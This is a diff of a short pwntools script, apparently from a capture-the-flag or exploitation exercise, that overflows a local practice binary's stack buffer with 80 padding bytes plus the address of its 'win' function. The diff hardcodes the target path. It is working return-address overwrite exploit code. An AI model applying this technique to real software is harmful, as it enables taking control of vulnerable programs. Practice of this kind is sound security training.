@@ -1,15 +1,10 @@
 #!/usr/bin/python
 from pwn import *
-import sys
 
-if len(sys.argv) == 1:
-    target = "./ret_overwrite"
-else:
-    target = sys.argv[1]
-
-e = ELF(target)
+e = ELF("./ret_overwrite")
 win_address = e.symbols["win"]
+#win_address = 0x400537
 
-p = process(target)
+p = process("./ret_overwrite")
 p.sendline("A" * 80 + p64(win_address))
 print p.recv()
